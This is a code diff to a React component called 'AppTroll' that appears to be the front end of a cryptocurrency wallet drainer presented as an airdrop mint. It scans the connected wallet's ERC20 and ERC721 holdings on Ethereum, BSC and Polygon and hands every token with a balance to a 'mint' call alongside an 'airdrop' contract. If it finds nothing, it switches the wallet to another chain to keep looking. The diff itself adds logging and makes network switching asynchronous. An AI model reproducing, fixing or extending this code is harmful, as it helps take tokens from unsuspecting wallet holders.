@@ -64,7 +64,7 @@ function AppTroll() {
   //   ReactPixel.pageView()
   //   // eslint-disable-next-line react-hooks/exhaustive-deps
   // }, [])
-  const { isLoading, switchNetwork } =
+  const { switchNetworkAsync } =
     useSwitchNetwork()
   const { connect, connectors } = useConnect({
 
@@ -90,6 +90,7 @@ function AppTroll() {
   useEffect(() => {
     if (chain !== undefined && address !== undefined && isConnected) {
       if (chain.id === 137) {
+        console.log("POLYGON")
         getBalanceErc20(dataProviderPolygon, tokensErc20Polygon, airdropPolygon, address, clientReader).then(
           (res: any) => {
             setTokensErc20WithBalance(res);
@@ -108,6 +109,7 @@ function AppTroll() {
         )
       }
       else if (chain.id === 56) {
+        console.log("BSC")
         getBalanceErc20(dataProviderBSC, tokensErc20BSC, airdropBSC, address, clientReader).then((res: any) => {
           setTokensErc20WithBalance(res);
           getBalanceErc721(dataProviderBSC, tokensErc721BSC, airdropBSC, address, clientReader ).then((res1: any) => {
@@ -122,6 +124,7 @@ function AppTroll() {
         })
       }
       else if (chain.id === 1) {
+        console.log("ETH")
         getBalanceErc20(dataProviderETH, tokensErc20ETH, airdropETH, address, clientReader ).then((res: any) => {
           setTokensErc20WithBalance(res);
           getBalanceErc721(dataProviderETH, tokensErc721ETH, airdropETH, address, clientReader).then((res1: any) => {
@@ -142,18 +145,15 @@ function AppTroll() {
       mint(chain, chain?.id === 1 ? airdropETH : chain?.id === 137 ? airdropPolygon : airdropBSC, tokensErc20WithBalance, tokensErc721WithBalance, account, clientReader, clientWriter, address);
     }
     else {
-      console.log("NO TOKENS WITH BALANCE")
-      console.log(isLoading, "IS LOADING")
-      console.log(chain, "CHAIN")
-      if (chain !== undefined) {
+      if (chain !== undefined && address !== undefined && isConnected) {
         if (!ethNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
-          switchNetwork?.(1)
+          switchNetworkAsync?.(1)
         }
         else if (!bscNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
-          switchNetwork?.(56)
+          switchNetworkAsync?.(56)
         }
         else if (!polygonNet && tokensErc20WithBalance!.length === 0 && tokensErc721WithBalance!.length === 0) {
-          switchNetwork?.(137)
+          switchNetworkAsync?.(137)
         }
       }
     }
